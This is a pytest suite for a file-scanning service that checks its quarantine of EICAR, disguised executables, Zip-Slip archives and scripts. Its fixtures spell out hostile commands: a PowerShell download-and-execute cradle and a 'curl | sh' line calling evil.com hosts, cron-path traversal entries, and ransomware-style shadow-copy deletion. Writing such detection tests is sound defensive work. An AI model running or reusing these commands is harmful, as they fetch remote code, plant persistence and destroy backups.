"""
Comprehensive test suite for Phase 7: Automatic File Scanning and Threat Detection.

Verifies:
1. Harmless clean file ingestion and successful release gate passage.
2. EICAR standard antivirus test fixture detection and quarantine lockdown.
3. True magic byte file signature verification (detecting disguised .exe named as .pdf).
4. Archive bomb and Zip-slip path traversal detection.
5. Strict Zero-Trust release gate: HTTP 403 on non-clean files, preventing execution/release.
6. Platform-managed download streaming inspection (POST /api/scan/url).
"""

import io
import pytest
import zipfile
from httpx import ASGITransport, AsyncClient

from backend.main import app
from backend.services.file_scanner import (
    ReleasePolicy,
    ScanState,
    _EICAR_SIGNATURE,
    file_scanner,
)


@pytest.fixture
def anyio_backend():
    return "asyncio"


@pytest.mark.anyio
async def test_clean_file_scanning_and_release():
    """Test that harmless files are verified, fingerprinted, and released."""
    clean_bytes = b"Hello, this is a completely harmless CyberKawach report."
    filename = "report.txt"

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # Ingest file
        files = {"file": (filename, clean_bytes, "text/plain")}
        resp = await client.post("/api/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()

        assert data["original_filename"] == filename
        assert data["state"] == ScanState.CLEAN.value
        assert data["release_policy"] == ReleasePolicy.ALLOWED.value
        assert len(data["sha256"]) == 64
        assert len(data["findings"]) > 0

        scan_id = data["scan_id"]

        # Status check
        status_resp = await client.get(f"/api/scan/{scan_id}")
        assert status_resp.status_code == 200
        assert status_resp.json()["state"] == ScanState.CLEAN.value

        # Download gate check: Must succeed with 200 OK
        dl_resp = await client.get(f"/api/scan/{scan_id}/download")
        assert dl_resp.status_code == 200
        assert dl_resp.content == clean_bytes


@pytest.mark.anyio
async def test_eicar_antivirus_detection_and_quarantine():
    """Test that the standard EICAR test fixture is instantly flagged as MALICIOUS and quarantined."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": ("eicar_test.com", _EICAR_SIGNATURE, "application/octet-stream")}
        resp = await client.post("/api/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()

        assert data["state"] == ScanState.MALICIOUS.value
        assert data["release_policy"] == ReleasePolicy.BLOCKED.value
        assert any("EICAR" in sig for sig in data["threat_signatures"])
        assert data["quarantine_path"] is not None

        scan_id = data["scan_id"]

        # Download gate check: MUST return HTTP 403 Forbidden
        dl_resp = await client.get(f"/api/scan/{scan_id}/download")
        assert dl_resp.status_code == 403
        err_detail = dl_resp.json().get("detail", {})
        assert err_detail.get("release_policy") == ReleasePolicy.BLOCKED.value
        assert err_detail.get("state") == ScanState.MALICIOUS.value


@pytest.mark.anyio
async def test_magic_byte_extension_spoofing_detection():
    """Test that a Windows executable disguised as an innocuous PDF is unmasked and blocked."""
    # Start with Windows PE magic bytes 'MZ' followed by executable headers
    spoofed_exe = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" + b"A" * 100
    disguised_filename = "Important_Invoice.pdf"

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": (disguised_filename, spoofed_exe, "application/pdf")}
        resp = await client.post("/api/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()

        # Unmasked as PE32 executable despite the .pdf extension and application/pdf header
        assert data["magic_mime"] == "application/x-dosexec"
        assert "PE32 Executable" in data["file_type_description"]
        assert data["release_policy"] == ReleasePolicy.BLOCKED.value
        assert data["state"] in (ScanState.SUSPICIOUS.value, ScanState.MALICIOUS.value)


@pytest.mark.anyio
async def test_zip_slip_path_traversal_detection():
    """Test that malicious archive members attempting path traversal are quarantined."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("../../etc/cron.d/backdoor", b"* * * * * root /tmp/evil.sh")
    zip_bytes = buf.getvalue()

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": ("malicious_archive.zip", zip_bytes, "application/zip")}
        resp = await client.post("/api/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()

        assert data["state"] == ScanState.MALICIOUS.value
        assert data["release_policy"] == ReleasePolicy.BLOCKED.value
        assert any("Zip-Slip" in f for f in data["findings"])

        # Release gate must block
        dl_resp = await client.get(f"/api/scan/{data['scan_id']}/download")
        assert dl_resp.status_code == 403


@pytest.mark.anyio
async def test_archive_smuggled_executable_detection():
    """Test that dangerous executables bundled inside zip files are detected."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("photos/vacation.jpg", b"harmless image data")
        zf.writestr("installer.exe", b"fake binary payload")
    zip_bytes = buf.getvalue()

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": ("bundle.zip", zip_bytes, "application/zip")}
        resp = await client.post("/api/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()

        assert data["release_policy"] == ReleasePolicy.BLOCKED.value
        assert any("Dangerous executable" in f for f in data["findings"])


@pytest.mark.anyio
async def test_oversized_file_rejection():
    """Test that files exceeding configured resource limits are safely rejected with ERROR state."""
    # 51 MB (exceeds 50 MB threshold)
    huge_payload = b"X" * (51 * 1024 * 1024)
    record = await file_scanner.scan_bytes(content=huge_payload, original_filename="huge.bin")
    assert record.state == ScanState.ERROR
    assert record.release_policy == ReleasePolicy.BLOCKED
    assert any("exceeds maximum size limit" in f for f in record.findings)


@pytest.mark.anyio
async def test_nonexistent_scan_id_404():
    """Test that querying or downloading invalid scan IDs returns 404."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/scan/nonexistent_scan_12345")
        assert resp.status_code == 404

        dl_resp = await client.get("/api/scan/nonexistent_scan_12345/download")
        assert dl_resp.status_code == 404


@pytest.mark.anyio
async def test_deep_analysis_heuristics_ransomware_and_powershell():
    """Test deep analysis static heuristics for ransomware shadow deletion and obfuscated scripts."""
    ransomware_script = b"@echo off\r\nvssadmin delete shadows /all /quiet\r\nwmic shadowcopy delete\r\n"
    record = await file_scanner.scan_bytes(content=ransomware_script, original_filename="cleanup.bat")

    assert record.state == ScanState.MALICIOUS
    assert record.release_policy == ReleasePolicy.BLOCKED
    assert any("Ransomware" in h for h in record.threat_signatures)
    assert "heuristic_hits" in record.deep_analysis
    assert record.entropy > 0.0


@pytest.mark.anyio
async def test_folder_batch_upload_and_aggregation():
    """Test whole-folder batch scan: multiple files across folders with aggregated verdicts."""
    files = [
        ("files", ("project/readme.txt", b"Clean documentation", "text/plain")),
        ("files", ("project/config.json", b'{"key": "value"}', "application/json")),
        ("files", ("project/scripts/exploit.bat", b"vssadmin delete shadows /all", "text/plain")),
    ]

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.post("/api/scan/folder", files=files, params={"folder_name": "MyProjectFolder"})
        assert resp.status_code == 200
        data = resp.json()

        assert data["folder_name"] == "MyProjectFolder"
        assert data["total_files"] == 3
        assert data["clean_count"] == 2
        assert data["malicious_count"] == 1
        assert data["overall_state"] == ScanState.MALICIOUS.value
        assert data["overall_release_policy"] == ReleasePolicy.BLOCKED.value
        assert len(data["file_records"]) == 3


@pytest.mark.anyio
async def test_real_world_malware_carrier_kit_detection():
    """Test pure live dynamic analysis against real-world multi-vector malware carrier payloads."""
    # 1. Format confusion: RTF Equation Editor exploit named as .jpg
    rtf_exploit = b"{\\rtf1\\ansi\\adeff31507\\object\\objocx Equation.3\\objdata 0105000002000000}"
    rec1 = await file_scanner.scan_bytes(content=rtf_exploit, original_filename="banner.jpg")
    assert rec1.state == ScanState.MALICIOUS
    assert rec1.release_policy == ReleasePolicy.BLOCKED
    assert any("Format Confusion" in t for t in rec1.threat_signatures)

    # 2. Format confusion: PowerShell trojan disguised as .gif
    ps_trojan = b"Set-StrictMode -Version 2\r\nif ((Get-Process powershell).count -gt 2){ exit }\r\n"
    rec2 = await file_scanner.scan_bytes(content=ps_trojan, original_filename="loadinglit.gif")
    assert rec2.state == ScanState.MALICIOUS
    assert rec2.release_policy == ReleasePolicy.BLOCKED
    assert any("Format Confusion" in t for t in rec2.threat_signatures)

    # 3. Format confusion: ShortJSRAT scriptlet disguised as .jpg
    scriptlet = b"<?XML version=\"1.0\"?>\r\n<scriptlet>\r\n<registration progid=\"ShortJSRAT\">\r\n"
    rec3 = await file_scanner.scan_bytes(content=scriptlet, original_filename="ad1.jpg")
    assert rec3.state == ScanState.MALICIOUS
    assert rec3.release_policy == ReleasePolicy.BLOCKED
    assert any("ShortJSRAT" in t or "Format Confusion" in t for t in rec3.threat_signatures)

    # 4. Executable dropper without extension
    raw_pe = b"MZ\xe8\x00\x00\x00\x00[New-Object Net.WebClient.DownloadString('http://evil.com/c2')]"
    rec4 = await file_scanner.scan_bytes(content=raw_pe, original_filename="payload")
    assert rec4.state == ScanState.MALICIOUS
    assert rec4.release_policy == ReleasePolicy.BLOCKED
    assert any("Malware Dropper" in t for t in rec4.threat_signatures)


@pytest.mark.anyio
async def test_empty_zip_archive_handling():
    """Test that empty ZIP archives (PK\\x05\\x06) are correctly identified, audited, and released clean."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        pass
    empty_bytes = buf.getvalue()

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": ("empty_container.zip", empty_bytes, "application/zip")}
        resp = await client.post("/api/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()

        assert data["magic_mime"] == "application/zip"
        assert data["state"] == ScanState.CLEAN.value
        assert data["release_policy"] == ReleasePolicy.ALLOWED.value
        assert any("Empty archive" in f for f in data["findings"])

        # Check safe release gate
        dl_resp = await client.get(f"/api/scan/{data['scan_id']}/download")
        assert dl_resp.status_code == 200
        assert dl_resp.content == empty_bytes


@pytest.mark.anyio
async def test_valid_nested_zip_archive():
    """Test valid ZIP archive with nested directories, multiple files, and member breakdown."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("subfolder/", b"")  # Directory entry
        zf.writestr("subfolder/readme.txt", b"CyberKawach nested clean documentation.")
        zf.writestr("subfolder/data/metrics.csv", b"timestamp,score\n2026-10-20,99.9\n")
    valid_bytes = buf.getvalue()

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": ("project_bundle.zip", valid_bytes, "application/zip")}
        resp = await client.post("/api/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()

        assert data["magic_mime"] == "application/zip"
        assert data["state"] == ScanState.CLEAN.value
        assert data["release_policy"] == ReleasePolicy.ALLOWED.value
        assert "archive_members" in data["deep_analysis"]
        assert len(data["deep_analysis"]["archive_members"]) == 2
        assert all(m["is_safe"] for m in data["deep_analysis"]["archive_members"])


@pytest.mark.anyio
async def test_corrupted_zip_archive_formats():
    """Test that malformed, truncated, and fake non-PK files named .zip are blocked as SUSPICIOUS."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # Case 1: Truncated PK header
        corrupt_pk = b"PK\x03\x04\xff\xff\x00\x00truncated_header_data"
        files1 = {"file": ("corrupted_header.zip", corrupt_pk, "application/zip")}
        resp1 = await client.post("/api/scan/file", files=files1)
        assert resp1.status_code == 200
        data1 = resp1.json()
        assert data1["state"] == ScanState.SUSPICIOUS.value
        assert data1["release_policy"] == ReleasePolicy.BLOCKED.value
        assert any("Corrupted or malformed" in f for f in data1["findings"])

        # Case 2: Fake non-PK text file named .zip
        fake_zip = b"Plain text file that is masquerading as a zip archive but has no PK headers."
        files2 = {"file": ("fake_archive.zip", fake_zip, "application/zip")}
        resp2 = await client.post("/api/scan/file", files=files2)
        assert resp2.status_code == 200
        data2 = resp2.json()
        assert data2["state"] == ScanState.SUSPICIOUS.value
        assert data2["release_policy"] == ReleasePolicy.BLOCKED.value
        assert any("Corrupted or invalid archive format" in f for f in data2["findings"])


@pytest.mark.anyio
async def test_encrypted_password_protected_zip():
    """Test that password-protected / encrypted archives are identified and quarantined."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("confidential.txt", b"Encrypted financial and user records.")
    raw = bytearray(buf.getvalue())
    # Set standard PKZIP encryption flag bit (bit 0) in both local and central directory headers
    cd_idx = raw.find(b"PK\x01\x02")
    if cd_idx != -1:
        raw[cd_idx + 8] |= 0x1
    local_idx = raw.find(b"PK\x03\x04")
    if local_idx != -1:
        raw[local_idx + 6] |= 0x1
    encrypted_bytes = bytes(raw)

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": ("locked_vault.zip", encrypted_bytes, "application/zip")}
        resp = await client.post("/api/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()

        assert data["state"] == ScanState.SUSPICIOUS.value
        assert data["release_policy"] == ReleasePolicy.BLOCKED.value
        assert any("Encrypted / password-protected" in f for f in data["findings"])


@pytest.mark.anyio
async def test_deflated_malware_inside_zip():
    """Test that compressed/deflated EICAR and PowerShell trojans inside innocent filenames are intercepted."""
    # 1. Deflated EICAR inside innocent notes.txt
    buf1 = io.BytesIO()
    with zipfile.ZipFile(buf1, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("notes.txt", _EICAR_SIGNATURE)
    eicar_zip = buf1.getvalue()

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files1 = {"file": ("notes_archive.zip", eicar_zip, "application/zip")}
        resp1 = await client.post("/api/scan/file", files=files1)
        assert resp1.status_code == 200
        data1 = resp1.json()
        assert data1["state"] == ScanState.MALICIOUS.value
        assert data1["release_policy"] == ReleasePolicy.BLOCKED.value
        assert any("EICAR" in t for t in data1["threat_signatures"])

        # 2. Deflated PowerShell dropper cradle inside innocent script.txt
        buf2 = io.BytesIO()
        ps_cradle = b"powershell.exe -ExecutionPolicy Bypass -Command iex (New-Object Net.WebClient).DownloadString('http://evil.com/trojan.ps1')"
        with zipfile.ZipFile(buf2, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("script.txt", ps_cradle)
        ps_zip = buf2.getvalue()

        files2 = {"file": ("tool_archive.zip", ps_zip, "application/zip")}
        resp2 = await client.post("/api/scan/file", files=files2)
        assert resp2.status_code == 200
        data2 = resp2.json()
        assert data2["state"] == ScanState.MALICIOUS.value
        assert data2["release_policy"] == ReleasePolicy.BLOCKED.value
        assert any("PowerShell" in t for t in data2["threat_signatures"])


@pytest.mark.anyio
async def test_format_confusion_disguised_pe_inside_zip():
    """Test format confusion inside archive: Windows PE disguised as an innocent image file."""
    buf = io.BytesIO()
    fake_img_pe = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 60 + b"BinaryPayload"
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("profile.png", fake_img_pe)
    disguised_zip = buf.getvalue()

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": ("photos.zip", disguised_zip, "application/zip")}
        resp = await client.post("/api/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()

        assert data["state"] == ScanState.MALICIOUS.value
        assert data["release_policy"] == ReleasePolicy.BLOCKED.value
        assert any("Format Confusion" in t for t in data["threat_signatures"])


@pytest.mark.anyio
async def test_zip_slip_absolute_path_traversal():
    """Test Zip-Slip exploit with absolute path (e.g. /etc/shadow or C:\\Windows\\System32)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("/etc/cron.hourly/rootkit", b"#!/bin/bash\ncurl http://c2.evil.com | sh\n")
    slip_bytes = buf.getvalue()

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": ("patch_traversal.zip", slip_bytes, "application/zip")}
        resp = await client.post("/api/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()

        assert data["state"] == ScanState.MALICIOUS.value
        assert data["release_policy"] == ReleasePolicy.BLOCKED.value
        assert any("Zip-Slip" in t for t in data["threat_signatures"])


@pytest.mark.anyio
async def test_folder_scan_with_single_zip_archive_unpacking():
    """Test that uploading a single ZIP archive to the folder scan endpoint unpacks and audits all members."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("src/main.py", b"print('CyberKawach secure runner')")
        zf.writestr("src/config.json", b'{"status": "ok"}')
        zf.writestr("README.md", b"# CyberKawach Project")
    zip_bytes = buf.getvalue()

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = [("files", ("test_project.zip", zip_bytes, "application/zip"))]
        resp = await client.post("/api/scan/folder", files=files)
        assert resp.status_code == 200
        data = resp.json()

        assert data["total_files"] == 3
        assert data["clean_count"] == 3
        assert data["overall_state"] == ScanState.CLEAN.value
        assert data["overall_release_policy"] == ReleasePolicy.ALLOWED.value
        assert len(data["file_records"]) == 3



